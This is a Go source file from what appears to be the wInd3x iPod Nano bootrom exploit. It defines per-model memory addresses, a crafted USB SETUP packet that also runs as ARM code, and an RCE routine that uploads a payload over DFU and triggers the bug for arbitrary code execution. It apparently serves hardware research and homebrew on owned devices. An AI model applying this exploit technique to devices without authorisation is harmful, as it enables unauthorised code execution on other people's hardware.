package exploit

import (
	"bytes"
	"fmt"
	"runtime"
	"time"

	"github.com/freemyipod/wInd3x/pkg/devices"
	"github.com/freemyipod/wInd3x/pkg/dfu"
	"github.com/freemyipod/wInd3x/pkg/uasm"

	"github.com/google/gousb"
)

type Parameters struct {
	// Address of the DFU data buffer.
	DFUBufAddr uint32
	// Address at which payload begins execution, within the DFU data buffer,
	// as jumped into by the SetupPacket.
	ExecAddr uint32
	// Address of the USB DMA buffer, ie. the SETUP packet currently being
	// processed.
	USBBufAddr    uint32
	HandlerFooter []uasm.Statement
	AESCall       []uasm.Statement
	// Address of trampoline in bootrom, jumped to by handler.
	TrampolineAddr uint16
	// Setup packet to be sent. This must also be valid ARM code, as it happens
	// to be executed.
	SetupPacket []byte
	// Address of 'mov r0, #1; bx lr' gadget.
	Ret1Addr uint32
	// Address of VTable (used to trigger HaxedDFU).
	VTableAddr uint32
}

func ldrOrMov(r uasm.Register, val uint32) uasm.Statement {
	if val >= 1<<12 {
		return uasm.Ldr{Dest: r, Src: uasm.Constant(val)}
	}
	return uasm.Mov{Dest: r, Src: uasm.Immediate(val)}
}

func makeCall(addr uint32, params ...uint32) []uasm.Statement {
	var stackParams []uint32
	if len(params) > 4 {
		stackParams = params[4:]
	}

	var res []uasm.Statement

	// Make space on stack, including LR save.
	stackFrame := len(stackParams)*4 + 4
	res = append(res,
		uasm.Sub{Dest: uasm.SP, Src: uasm.SP, Compl: uasm.Immediate(stackFrame)},
	)
	// Save LR.
	r4Loc := uint16(len(stackParams)) * 4
	res = append(res,
		uasm.Str{Src: uasm.LR, Dest: uasm.Deref(uasm.SP, r4Loc)},
	)
	// Set stack params.
	for i := len(stackParams) - 1; i >= 0; i-- {
		offs := 4 * uint16(i)
		res = append(res,
			ldrOrMov(uasm.R0, stackParams[i]),
			uasm.Str{Src: uasm.R0, Dest: uasm.Deref(uasm.SP, offs)},
		)
	}
	// Set register params.
	for i := 0; i < len(params[:4]); i++ {
		res = append(res,
			ldrOrMov(uasm.Register(i), params[i]),
		)
	}
	// Perform call.
	res = append(res,
		uasm.Ldr{Dest: uasm.LR, Src: uasm.Constant(addr)},
		uasm.Blx{Dest: uasm.LR},
	)

	// Restore LR.
	res = append(res,
		uasm.Ldr{Dest: uasm.LR, Src: uasm.Deref(uasm.SP, r4Loc)},
	)
	// Clean up stack.
	res = append(res,
		uasm.Add{Dest: uasm.SP, Src: uasm.SP, Compl: uasm.Immediate(stackFrame)},
	)

	return res
}

var ParametersForKind = map[devices.Kind]*Parameters{
	devices.Nano3: &Parameters{
		DFUBufAddr: 0x22028220,
		ExecAddr:   0x220282A8,
		USBBufAddr: 0x22028A20,

		HandlerFooter: []uasm.Statement{
			uasm.Bx{Dest: uasm.LR},
		},

		AESCall: makeCall(0x20001f04, 0x22028220, 0x40, 1, 0, 0),

		// No trampoline necessary.
		TrampolineAddr: 0,
		// b 0x2202dc08
		SetupPacket: []byte{0x20, 0xfe, 0xff, 0xea, 0x06, 0x00, 0x00, 0x00},
		Ret1Addr:    0x20000d10,
		// No VTable, no haxeddfu.
		VTableAddr: 0,
	},
	devices.Nano4: &Parameters{
		DFUBufAddr: 0x2202db00,
		ExecAddr:   0x2202dc08,
		USBBufAddr: 0x2202e300,

		HandlerFooter: []uasm.Statement{
			// Fixup LR (after trampoline blx messes it up)
			uasm.Ldr{Dest: uasm.LR, Src: uasm.Constant(0x20004d64)},
			uasm.Bx{Dest: uasm.LR},
		},

		AESCall: makeCall(0x200020d4, 0x2202db00, 0x2202db00, 0x40, 1, 0, 0),

		TrampolineAddr: 0x3b0,
		// b 0x2202dc08
		SetupPacket: []byte{0x40, 0xfe, 0xff, 0xea, 0x03, 0x00, 0x00, 0x00},
		Ret1Addr:    0x20000d10,
		VTableAddr:  0x2202fff8,
	},
	devices.Nano5: &Parameters{
		DFUBufAddr: 0x2202db00,
		ExecAddr:   0x2202dc08,
		USBBufAddr: 0x2202e300,

		HandlerFooter: []uasm.Statement{
			// Fixup LR (after trampoline blx messes it up)
			uasm.Ldr{Dest: uasm.LR, Src: uasm.Constant(0x20004d70)},
			uasm.Bx{Dest: uasm.LR},
		},

		AESCall: makeCall(0x200020ec, 0x2202db00, 0x2202db00, 0x40, 1, 0, 0),

		TrampolineAddr: 0x37c,
		// b 0x2202dc08
		SetupPacket: []byte{0x40, 0xfe, 0xff, 0xea, 0x03, 0x00, 0x00, 0x00},
		Ret1Addr:    0x20000cbc,
		VTableAddr:  0x2202fff8,
	},
}

func RCE(usb *gousb.Device, ep *Parameters, payload []byte, data []byte) error {
	usb.ControlTimeout = time.Millisecond * 50

	prefixLen := int(ep.ExecAddr - ep.DFUBufAddr)
	if len(data) > prefixLen {
		return fmt.Errorf("data too long")
	}
	pad := bytes.Repeat([]byte{'Z'}, prefixLen-len(data))
	data = append(data, pad...)
	payload = append(data, payload...)

	// Upload payload into DFU buffer, and reset status afterwards.
	if len(payload) > 0x400 {
		return fmt.Errorf("payload too large (%d > %d)", len(payload), 0x400)
	}
	if err := dfu.SendChunk(usb, payload, 0); err != nil {
		return fmt.Errorf("Upload: %w", err)
	}
	if err := dfu.Clean(usb); err != nil {
		return fmt.Errorf("clean: %w", err)
	}

	buf := make([]byte, 0x40)
	if _, err := usb.Control(0xa1, uint8(dfu.RequestUpload), 0, 0, buf); err != nil {
		return fmt.Errorf("first upload failed: %v", err)
	}

	if ep.TrampolineAddr != 0 {
		// Start a download of X+0x40 bytes, this will only send 0x40 bytes
		// (for some reason large control transfers don't work?), causing a state
		// structure field to be set to X.
		// X = TrampolineAddr, which is 0x3b0 for Nano 4G and 0x37c for Nano 5G
		l := ep.TrampolineAddr + 0x40
		buf = make([]byte, l)
		_, err := usb.Control(0xa1, uint8(dfu.RequestUpload), 0, 0, buf)
		if want, got := gousb.ErrorTimeout, err; want != got {
			return fmt.Errorf("upload trigger should have returned %v, got %v", want, got)
		}
	}

	// Trigger bug. This should get the payload executing.
	bmRequestType := ep.SetupPacket[0]
	bRequest := ep.SetupPacket[1]
	wValue := uint16(ep.SetupPacket[2]) | (uint16(ep.SetupPacket[3]) << 8)
	wIndex := uint16(ep.SetupPacket[4]) | (uint16(ep.SetupPacket[5]) << 8)
	_, err := usb.Control(bmRequestType, bRequest, wValue, wIndex, nil)
	if runtime.GOOS == "windows" {
		if err != nil {
			return fmt.Errorf("bug trigger: %w", err)
		}
	} else {
		// Honestly no idea why it times out on Linux. It probably shouldn't?
		// When we run the exploit correctly, we should be doing things
		// gracefully, returning from the handler correctly and whatnot. So
		// what's up with that?
		if want, got := gousb.ErrorTimeout, err; want != got {
			return fmt.Errorf("bug trigger should have returned %v, got %v", want, got)
		}
	}

	return nil

}
